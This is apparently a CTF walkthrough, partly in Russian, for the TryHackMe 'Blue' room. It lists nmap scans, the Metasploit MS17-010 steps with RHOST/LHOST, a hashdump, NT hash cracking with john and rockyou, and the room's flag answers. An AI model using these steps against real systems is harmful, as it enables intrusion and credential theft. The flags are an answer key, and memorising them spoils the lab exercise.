# Blue

## Link: https://tryhackme.com/room/blue

Уязвимость основана на переполнении буфера в обработке SMB-запросов. MS17-010 на самом деле включает в себя несколько различных программных ошибок в Windows SMB Server, среди которых неправильное присвоение типов (Wrong type assignment) и отсутствие проверки последовательности команд при выполнении SMB-транзакций.а 

### Task 1

```
nmap 10.80.159.9
```

```
nmap -sV --script=vuln 10.80.159.9
```

### Task 2

```
msfconsole
```

```
search ms17-010
```

```
use 1
```

```
show options
```

```
set RHOST 10.80.159.9
set LHOST 192.168.205.204
```

### Task 4
```
hashdump
```

```
john --format=NT --wordlist=rockyou.txt password
```

### Task 5

#### flag 1

```
C:\
dir

flag{access_the_machine}
```

#### flag 2

```
C:\Windows\system32\config
dir

flag{sam_database_elevated_access}
```

#### flag 3

```
search -f flag3.txt

flag{admin_documents_can_be_valuable}
```